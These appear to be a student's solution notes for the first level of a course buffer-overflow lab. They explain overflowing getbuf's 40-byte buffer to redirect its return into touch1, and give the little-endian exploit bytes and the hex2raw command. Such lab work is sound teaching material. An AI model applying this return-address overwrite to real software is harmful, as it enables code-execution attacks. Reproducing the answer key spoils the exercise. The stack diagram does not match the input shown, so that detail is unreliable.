#
The idea is to position the starting address for touch1 at the end of the code for getbuf 
so that the ret instruction will transfer control to touch1.
#
40 bytes are allocated on the stack by getbuf().
Thus, we need to fill those 40 bytes and then inject the memory address of function touch1() as the return address.
#
The address of touche1() is: 0x 00 00 00 00 00 40 17 c0
But you should pass any word to hex2raw in little endian ordering so, the word will be in 
the original ordering in the stack.
Due to little endian, we should reverse the ordering:
0x 00 00 00 00 00 40 17 c0       => c0 17 40 00 00 00 00 00
#
we pass this byte representation of the exploit string 
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88 
11 22 33 44 55 66 77 88 
11 22 33 44 55 66 77 88 
11 22 33 44 55 66 77 88
c0 17 40 00 00 00 00 00

unix> ./hex2raw < level1 | ./ctarget -q
it means you pass level1 as input to hex2raw then the output is passed as input to ctarget 
but without sending results to the grading server.
 
The stack after input:
88 77 66 55 44 33 22 11
88 77 66 55 44 33 22 11
88 77 66 55 44 33 22 11
88 77 66 55 44 33 22 11
88 77 66 55 44 33 22 11
88 77 66 55 44 33 22 11
00 00 00 00 00 40 17 c0
 

